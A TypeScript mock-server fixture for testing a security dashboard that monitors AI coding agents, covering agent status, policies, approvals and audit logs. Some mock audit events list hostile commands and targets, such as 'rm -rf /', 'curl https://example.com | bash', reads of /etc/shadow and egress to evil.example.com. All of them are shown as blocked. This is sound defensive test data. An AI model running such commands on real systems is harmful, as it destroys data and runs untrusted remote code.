import { http, HttpResponse } from "msw";
import { setupServer } from "msw/node";

// -- Mock data --

const MOCK_HEALTH = {
  status: "healthy",
  version: "0.2.7-test",
  uptime_secs: 3600,
  session_id: "test-session-001",
  audit_count: 42,
};

const MOCK_AGENTS = {
  generated_at: new Date().toISOString(),
  stale_after_secs: 90,
  endpoints: [
    {
      endpoint_agent_id: "agent-test-001",
      last_heartbeat_at: new Date().toISOString(),
      last_seen_ip: "127.0.0.1",
      last_session_id: "sess-001",
      posture: "strict",
      policy_version: "sha256:abc",
      daemon_version: "0.2.7",
      runtime_count: 2,
      seconds_since_heartbeat: 10,
      online: true,
      drift: { policy_drift: false, daemon_drift: false, stale: false },
    },
    {
      endpoint_agent_id: "agent-test-002",
      last_heartbeat_at: new Date(Date.now() - 120_000).toISOString(),
      last_seen_ip: "10.0.0.5",
      last_session_id: "sess-002",
      posture: "default",
      policy_version: "sha256:old",
      daemon_version: "0.2.3",
      runtime_count: 0,
      seconds_since_heartbeat: 120,
      online: false,
      drift: { policy_drift: true, daemon_drift: true, stale: true },
    },
    {
      endpoint_agent_id: "agent-test-003",
      last_heartbeat_at: new Date(Date.now() - 30_000).toISOString(),
      last_seen_ip: "192.168.1.10",
      last_session_id: "sess-003",
      posture: "permissive",
      policy_version: "sha256:abc",
      daemon_version: "0.2.7",
      runtime_count: 1,
      seconds_since_heartbeat: 30,
      online: true,
      drift: { policy_drift: false, daemon_drift: false, stale: false },
    },
    {
      endpoint_agent_id: "agent-test-004",
      last_heartbeat_at: new Date(Date.now() - 300_000).toISOString(),
      last_seen_ip: "172.16.0.42",
      last_session_id: "sess-004",
      posture: "ai-agent",
      policy_version: "sha256:def",
      daemon_version: "0.2.4",
      runtime_count: 3,
      seconds_since_heartbeat: 300,
      online: false,
      drift: { policy_drift: true, daemon_drift: false, stale: true },
    },
    {
      endpoint_agent_id: "agent-test-005",
      last_heartbeat_at: new Date(Date.now() - 5_000).toISOString(),
      last_seen_ip: "10.0.1.100",
      last_session_id: "sess-005",
      posture: "strict",
      policy_version: "sha256:abc",
      daemon_version: "0.2.7",
      runtime_count: 1,
      seconds_since_heartbeat: 5,
      online: true,
      drift: { policy_drift: false, daemon_drift: false, stale: false },
    },
    {
      endpoint_agent_id: "agent-test-006",
      last_heartbeat_at: new Date(Date.now() - 600_000).toISOString(),
      last_seen_ip: "10.0.2.200",
      last_session_id: "sess-006",
      posture: "cicd",
      policy_version: "sha256:xyz",
      daemon_version: "0.2.2",
      runtime_count: 0,
      seconds_since_heartbeat: 600,
      online: false,
      drift: { policy_drift: true, daemon_drift: true, stale: true },
    },
  ],
  runtimes: [
    {
      runtime_agent_id: "rt-claude-001",
      endpoint_agent_id: "agent-test-001",
      runtime_agent_kind: "claude-code",
      last_heartbeat_at: new Date().toISOString(),
      last_session_id: "sess-001",
      posture: "strict",
      policy_version: "sha256:abc",
      daemon_version: "0.2.7",
      seconds_since_heartbeat: 10,
      online: true,
      drift: { policy_drift: false, daemon_drift: false, stale: false },
    },
  ],
};

const MOCK_POLICY = {
  name: "test-policy",
  version: "1.0.0",
  description: "Mock policy for testing",
  policy_hash: "sha256:test123456789",
  yaml: 'schema_version: "1.2.0"\nname: test-policy\nextends: strict\n',
  source: {
    kind: "file",
    path: "/etc/clawdstrike/policy.yaml",
    path_exists: true,
  },
  schema: { current: "1.2.0", supported: ["1.1.0", "1.2.0"] },
};

const MOCK_AUDIT_EVENTS = [
  {
    id: "evt-001",
    timestamp: new Date().toISOString(),
    action_type: "file_read",
    target: "/etc/shadow",
    decision: "deny",
    guard: "ForbiddenPathGuard",
    severity: "high",
    session_id: "sess-001",
    agent_id: "agent-test-001",
  },
  {
    id: "evt-002",
    timestamp: new Date(Date.now() - 60_000).toISOString(),
    action_type: "network_egress",
    target: "api.openai.com",
    decision: "allow",
    guard: "EgressAllowlistGuard",
    session_id: "sess-001",
    agent_id: "agent-test-001",
  },
  {
    id: "evt-003",
    timestamp: new Date(Date.now() - 120_000).toISOString(),
    action_type: "shell_command",
    target: "rm -rf /",
    decision: "deny",
    guard: "ShellCommandGuard",
    severity: "critical",
    session_id: "sess-002",
    agent_id: "agent-test-002",
  },
  {
    id: "evt-004",
    timestamp: new Date(Date.now() - 180_000).toISOString(),
    action_type: "file_write",
    target: "/tmp/output.txt",
    decision: "allow",
    guard: "PathAllowlistGuard",
    session_id: "sess-001",
    agent_id: "agent-test-001",
  },
  {
    id: "evt-005",
    timestamp: new Date(Date.now() - 240_000).toISOString(),
    action_type: "mcp_tool",
    target: "browser_navigate",
    decision: "deny",
    guard: "McpToolGuard",
    severity: "medium",
    session_id: "sess-003",
    agent_id: "agent-test-003",
  },
  {
    id: "evt-006",
    timestamp: new Date(Date.now() - 300_000).toISOString(),
    action_type: "file_write",
    target: "/home/user/.env",
    decision: "deny",
    guard: "SecretLeakGuard",
    severity: "high",
    session_id: "sess-002",
    agent_id: "agent-test-002",
  },
  {
    id: "evt-007",
    timestamp: new Date(Date.now() - 360_000).toISOString(),
    action_type: "network_egress",
    target: "evil.example.com",
    decision: "deny",
    guard: "EgressAllowlistGuard",
    severity: "high",
    session_id: "sess-004",
    agent_id: "agent-test-004",
  },
  {
    id: "evt-008",
    timestamp: new Date(Date.now() - 420_000).toISOString(),
    action_type: "shell_command",
    target: "curl https://example.com | bash",
    decision: "deny",
    guard: "ShellCommandGuard",
    severity: "critical",
    session_id: "sess-005",
    agent_id: "agent-test-005",
  },
  {
    id: "evt-009",
    timestamp: new Date(Date.now() - 480_000).toISOString(),
    action_type: "file_read",
    target: "/usr/local/config.yaml",
    decision: "allow",
    guard: "PathAllowlistGuard",
    session_id: "sess-003",
    agent_id: "agent-test-003",
  },
  {
    id: "evt-010",
    timestamp: new Date(Date.now() - 540_000).toISOString(),
    action_type: "prompt_injection",
    target: "user-input-block",
    decision: "deny",
    guard: "PromptInjectionGuard",
    severity: "critical",
    session_id: "sess-006",
    agent_id: "agent-test-006",
  },
];

const MOCK_CATALOG_TEMPLATES = [
  {
    id: "a7f6fe4d-1111-4444-8888-aaaaaaaaaaaa",
    name: "Remote AI Agent Policy",
    description: "Catalog template served by the control-api schema",
    category: "ai-agent",
    tags: ["remote", "ai-agent", "soc2", "difficulty:advanced"],
    policy_yaml: `version: "1.2.0"
name: "remote-ai-agent"
description: "Remote AI agent policy"
guards:
  forbidden_path:
    enabled: true
    patterns:
      - "/etc/shadow"
  shell_command:
    enabled: true
`,
    author: "Clawdstrike Team",
    version: "2026.03",
    created_at: new Date(Date.now() - 86_400_000).toISOString(),
    updated_at: new Date().toISOString(),
    downloads: 12,
    forked_from: null,
  },
];

const MOCK_CATALOG_CATEGORIES = [
  {
    id: "ai-agent",
    name: "AI Agent",
    description: "Policies optimized for AI coding assistants",
    template_count: MOCK_CATALOG_TEMPLATES.length,
  },
];

const MOCK_APPROVAL_REQUESTS = [
  {
    id: "apr-001",
    originContext: {
      provider: "slack",
      tenant_id: "T-test",
      space_id: "C-general",
      space_type: "channel",
      actor_id: "U-alice",
      actor_name: "alice",
      visibility: "public",
    },
    enclaveId: "enclave-prod",
    toolName: "shell_exec",
    reason: "Need to restart service",
    requestedBy: "agent-test-001",
    requestedAt: new Date(Date.now() - 60_000).toISOString(),
    expiresAt: new Date(Date.now() + 300_000).toISOString(),
    status: "pending",
    agentId: "agent-test-001",
    agentName: "Claude Coder",
    capability: "CommandExec",
    riskLevel: "high",
  },
  {
    id: "apr-002",
    originContext: {
      provider: "github",
      tenant_id: "backbay-labs",
      space_id: "PR-42",
      space_type: "pull_request",
      actor_id: "U-bob",
      actor_name: "bob",
    },
    toolName: "file_write",
    reason: "Write deployment config",
    requestedBy: "agent-test-003",
    requestedAt: new Date(Date.now() - 120_000).toISOString(),
    expiresAt: new Date(Date.now() + 600_000).toISOString(),
    status: "pending",
    agentId: "agent-test-003",
    riskLevel: "medium",
  },
];

const MOCK_APPROVAL_DECISIONS = [
  {
    requestId: "apr-000",
    decision: "approved",
    scope: { ttlSeconds: 300, threadOnly: true },
    reason: "One-time approval for deploy",
    decidedBy: "workbench-user",
    decidedAt: new Date(Date.now() - 3_600_000).toISOString(),
  },
];

const MOCK_GRANTS = [
  {
    id: "grant-001",
    issuer_principal_id: "principal-root",
    subject_principal_id: "principal-agent-001",
    grant_type: "delegation",
    delegation_depth: 1,
    status: "active",
    purpose: "Code review automation",
    capabilities: ["FileRead", "FileWrite"],
  },
  {
    id: "grant-002",
    issuer_principal_id: "principal-agent-001",
    subject_principal_id: "principal-agent-002",
    grant_type: "sub-delegation",
    delegation_depth: 2,
    status: "active",
    purpose: "Test execution",
    capabilities: ["CommandExec"],
  },
];

const MOCK_PRINCIPALS = [
  {
    principalId: "principal-root",
    principalType: "operator",
    displayName: "Root Operator",
    stableRef: "root-operator",
    lifecycleState: "active",
    livenessState: "online",
    endpointPosture: "strict",
    trustLevel: "high",
    capabilityGroupNames: ["DelegationAdmin", "PolicyWrite"],
    lastHeartbeatAt: new Date().toISOString(),
  },
  {
    principalId: "principal-agent-001",
    principalType: "agent",
    displayName: "Build Agent",
    stableRef: "build-agent-001",
    lifecycleState: "active",
    livenessState: "online",
    endpointPosture: "default",
    trustLevel: "medium",
    capabilityGroupNames: ["CommandExec"],
    lastHeartbeatAt: new Date(Date.now() - 30_000).toISOString(),
  },
];

// -- Handler helpers --

function requireAuth(request: Request): HttpResponse<null> | null {
  if (!request.headers.get("Authorization")) {
    return new HttpResponse(null, { status: 401 });
  }
  return null;
}

function validatePolicyBody(body: { yaml: string }) {
  const valid = body.yaml.includes("schema_version");
  return HttpResponse.json({
    valid,
    errors: valid ? [] : ["Missing schema_version"],
    warnings: [],
  });
}

/**
 * Build hushd handlers for a URL prefix. Generates identical handlers for
 * both direct (http://localhost:9876) and dev-proxy (/_proxy/hushd) paths.
 */
function hushdHandlersForPrefix(prefix: string) {
  return [
    http.get(`${prefix}/health`, () => HttpResponse.json(MOCK_HEALTH)),

    http.get(`${prefix}/api/v1/agents/status`, ({ request }) => {
      return requireAuth(request) ?? HttpResponse.json(MOCK_AGENTS);
    }),

    http.get(`${prefix}/api/v1/policy`, ({ request }) => {
      return requireAuth(request) ?? HttpResponse.json(MOCK_POLICY);
    }),

    http.post(`${prefix}/api/v2/policy`, async ({ request }) => {
      return requireAuth(request) ?? HttpResponse.json({ policy_hash: "sha256:deployed123" });
    }),

    http.post(`${prefix}/api/v2/policy/validate`, async ({ request }) => {
      const body = (await request.json()) as { yaml: string };
      return validatePolicyBody(body);
    }),

    http.get(`${prefix}/api/v1/audit`, ({ request }) => {
      return requireAuth(request) ?? HttpResponse.json({ events: MOCK_AUDIT_EVENTS });
    }),
  ];
}

const controlApiHandlers = [
  http.get("/_proxy/control/api/v1/agents", ({ request }) => {
    const err = requireAuth(request);
    if (err) return err;
    return HttpResponse.json(
      MOCK_AGENTS.endpoints.map((e) => ({
        id: `ctrl-${e.endpoint_agent_id}`,
        tenant_id: "test-tenant",
        agent_id: e.endpoint_agent_id,
        name: e.endpoint_agent_id,
        public_key: "test",
        role: "coder",
        trust_level: "medium",
        status: e.online ? "active" : "stale",
        last_heartbeat_at: e.last_heartbeat_at,
        metadata: {},
        created_at: new Date().toISOString(),
      })),
    );
  }),

  http.get("/_proxy/control/api/v1/approvals", ({ request }) => {
    return requireAuth(request) ?? HttpResponse.json({
      requests: MOCK_APPROVAL_REQUESTS,
      decisions: MOCK_APPROVAL_DECISIONS,
    });
  }),

  http.post("/_proxy/control/api/v1/approvals/:id/resolve", async ({ request, params }) => {
    const err = requireAuth(request);
    if (err) return err;
    const body = (await request.json()) as { decision: string };
    const id = params.id as string;
    if (id === "nonexistent") {
      return new HttpResponse(JSON.stringify({ error: "Not found" }), { status: 404 });
    }
    return HttpResponse.json({ ok: true, id, decision: body.decision });
  }),

  http.post("/_proxy/control/api/v1/policies/deploy", async ({ request }) => {
    return requireAuth(request) ?? HttpResponse.json({ success: true, hash: "sha256:distributed456" });
  }),

  http.get("/_proxy/control/api/v1/grants", ({ request }) => {
    return requireAuth(request) ?? HttpResponse.json([]);
  }),

  http.get("/_proxy/control/api/v1/principals", ({ request }) => {
    const err = requireAuth(request);
    if (err) return err;
    return new HttpResponse(
      JSON.stringify({ error: "route not found" }),
      { status: 404, headers: { "Content-Type": "application/json" } },
    );
  }),

  http.get("/_proxy/control/api/v1/console/principals", ({ request }) => {
    const err = requireAuth(request);
    if (err) return err;
    return HttpResponse.json(MOCK_PRINCIPALS);
  }),

  http.get("/_proxy/control/api/v1/catalog/templates", ({ request }) => {
    const err = requireAuth(request);
    if (err) return err;
    return HttpResponse.json(MOCK_CATALOG_TEMPLATES);
  }),

  http.get("/_proxy/control/api/v1/catalog/categories", ({ request }) => {
    const err = requireAuth(request);
    if (err) return err;
    return HttpResponse.json(MOCK_CATALOG_CATEGORIES);
  }),

  http.get("/_proxy/control/api/v1/catalog/templates/:id", ({ request, params }) => {
    const err = requireAuth(request);
    if (err) return err;
    const template = MOCK_CATALOG_TEMPLATES.find((item) => item.id === params.id);
    return template
      ? HttpResponse.json(template)
      : new HttpResponse(JSON.stringify({ error: "Not found" }), { status: 404 });
  }),

  http.post("/_proxy/control/api/v1/catalog/templates", async ({ request }) => {
    const err = requireAuth(request);
    if (err) return err;
    const body = (await request.json()) as {
      name: string;
      description: string;
      category: string;
      tags?: string[];
      policy_yaml: string;
      version?: string;
    };
    return HttpResponse.json({
      id: "a7f6fe4d-2222-4444-8888-bbbbbbbbbbbb",
      name: body.name,
      description: body.description,
      category: body.category,
      tags: body.tags ?? [],
      policy_yaml: body.policy_yaml,
      author: "Workbench",
      version: body.version ?? "1.2.0",
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      downloads: 0,
      forked_from: null,
    });
  }),

  http.post("/_proxy/control/api/v1/catalog/templates/:id/fork", ({ request, params }) => {
    const err = requireAuth(request);
    if (err) return err;
    const source = MOCK_CATALOG_TEMPLATES.find((item) => item.id === params.id);
    if (!source) {
      return new HttpResponse(JSON.stringify({ error: "Not found" }), { status: 404 });
    }
    return HttpResponse.json({
      ...source,
      id: "a7f6fe4d-3333-4444-8888-cccccccccccc",
      name: `${source.name} (fork)`,
      downloads: 0,
      forked_from: source.id,
    });
  }),
];

// -- Server setup --

export const mockFleetServer = setupServer(
  ...hushdHandlersForPrefix("http://localhost:9876"),
  ...hushdHandlersForPrefix("/_proxy/hushd"),
  ...controlApiHandlers,
);

export const MOCK_DATA = {
  health: MOCK_HEALTH,
  agents: MOCK_AGENTS,
  policy: MOCK_POLICY,
  auditEvents: MOCK_AUDIT_EVENTS,
  catalogTemplates: MOCK_CATALOG_TEMPLATES,
  catalogCategories: MOCK_CATALOG_CATEGORIES,
  approvalRequests: MOCK_APPROVAL_REQUESTS,
  approvalDecisions: MOCK_APPROVAL_DECISIONS,
  grants: MOCK_GRANTS,
  principals: MOCK_PRINCIPALS,
};

export function injectError(endpoint: string, status: number) {
  mockFleetServer.use(
    http.get(endpoint, () => new HttpResponse(null, { status })),
  );
}

export function injectPostError(endpoint: string, status: number) {
  mockFleetServer.use(
    http.post(endpoint, () => new HttpResponse(null, { status })),
  );
}

export function injectBareArrayAuditResponse() {
  mockFleetServer.use(
    http.get("/_proxy/hushd/api/v1/audit", ({ request }) => {
      return requireAuth(request) ?? HttpResponse.json(MOCK_AUDIT_EVENTS);
    }),
  );
}

export function injectGrantsData() {
  mockFleetServer.use(
    http.get("/_proxy/control/api/v1/grants", ({ request }) => {
      return requireAuth(request) ?? HttpResponse.json(MOCK_GRANTS);
    }),
  );
}

export function injectHierarchyTreeResponse(response: {
  root_id: string | null;
  nodes: unknown[];
}) {
  mockFleetServer.use(
    http.get("/_proxy/control/api/v1/hierarchy/tree", ({ request }) => {
      return requireAuth(request) ?? HttpResponse.json(response);
    }),
  );
}

export function injectEmptyApprovals() {
  mockFleetServer.use(
    http.get("/_proxy/control/api/v1/approvals", ({ request }) => {
      return requireAuth(request) ?? HttpResponse.json({ requests: [], decisions: [] });
    }),
  );
}

/**
 * Backend-shaped approval rows (as returned by control-api's `list_approvals`).
 * These use the Rust `Approval` struct shape with an opaque `event_data` JSONB blob.
 */
export const MOCK_BACKEND_APPROVALS = [
  {
    id: "a1b2c3d4-0000-0000-0000-000000000001",
    tenant_id: "t1t2t3t4-0000-0000-0000-000000000001",
    principal_id: null,
    agent_id: "agent-test-001",
    request_id: "apr-backend-001",
    event_type: "approval.request",
    event_data: {
      tool: "shell_exec",
      reason: "Need to restart service",
      severity: "high",
      session_id: "sess-001",
      expires_at: new Date(Date.now() + 300_000).toISOString(),
      origin_context: {
        provider: "slack",
        tenant_id: "T-test",
        space_id: "C-general",
        space_type: "channel",
        actor_id: "U-alice",
        actor_name: "alice",
        visibility: "public",
      },
      agent_name: "Claude Coder",
      capability: "CommandExec",
      risk_level: "high",
      enclave_id: "enclave-prod",
      requested_by: "agent-test-001",
    },
    status: "pending",
    resolved_by: null,
    resolved_at: null,
    created_at: new Date(Date.now() - 60_000).toISOString(),
  },
  {
    id: "a1b2c3d4-0000-0000-0000-000000000002",
    tenant_id: "t1t2t3t4-0000-0000-0000-000000000001",
    principal_id: null,
    agent_id: "agent-test-003",
    request_id: "apr-backend-002",
    event_type: "approval.request",
    event_data: {
      tool: "file_write",
      reason: "Write deployment config",
      origin_context: {
        provider: "github",
        tenant_id: "backbay-labs",
        space_id: "PR-42",
        space_type: "pull_request",
        actor_id: "U-bob",
        actor_name: "bob",
      },
      risk_level: "medium",
      expires_at: new Date(Date.now() + 600_000).toISOString(),
    },
    status: "pending",
    resolved_by: null,
    resolved_at: null,
    created_at: new Date(Date.now() - 120_000).toISOString(),
  },
  {
    id: "a1b2c3d4-0000-0000-0000-000000000003",
    tenant_id: "t1t2t3t4-0000-0000-0000-000000000001",
    principal_id: null,
    agent_id: "agent-test-002",
    request_id: "apr-backend-003",
    event_type: "approval.request",
    event_data: {
      tool: "network_egress",
      reason: "Fetch dependency from npm",
      risk_level: "low",
      expires_at: new Date(Date.now() - 60_000).toISOString(), // already expired
    },
    status: "pending", // still "pending" in DB but actually expired
    resolved_by: null,
    resolved_at: null,
    created_at: new Date(Date.now() - 600_000).toISOString(),
  },
  {
    id: "a1b2c3d4-0000-0000-0000-000000000004",
    tenant_id: "t1t2t3t4-0000-0000-0000-000000000001",
    principal_id: null,
    agent_id: "agent-test-004",
    request_id: "apr-backend-004",
    event_type: "approval.request",
    event_data: {
      tool: "mcp_tool:database-query",
      resolution_reason: "Approved by admin for routine maintenance",
    },
    status: "approved",
    resolved_by: "admin@acme.corp",
    resolved_at: new Date(Date.now() - 300_000).toISOString(),
    created_at: new Date(Date.now() - 600_000).toISOString(),
  },
];

/**
 * Inject backend-shaped approval rows (flat array) as the response from
 * the control-api approvals endpoint.
 */
export function injectBackendShapedApprovals() {
  mockFleetServer.use(
    http.get("/_proxy/control/api/v1/approvals", ({ request }) => {
      return requireAuth(request) ?? HttpResponse.json(MOCK_BACKEND_APPROVALS);
    }),
  );
}

/**
 * Inject a backend-shaped response with minimal/missing event_data fields
 * to test graceful defaults.
 */
export function injectMinimalBackendApprovals() {
  mockFleetServer.use(
    http.get("/_proxy/control/api/v1/approvals", ({ request }) => {
      return requireAuth(request) ?? HttpResponse.json([
        {
          id: "a1b2c3d4-0000-0000-0000-000000000099",
          tenant_id: "t1t2t3t4-0000-0000-0000-000000000001",
          agent_id: "agent-minimal",
          request_id: "apr-minimal-001",
          event_type: "approval.request",
          event_data: {},
          status: "pending",
          created_at: new Date(Date.now() - 60_000).toISOString(),
        },
      ]);
    }),
  );
}
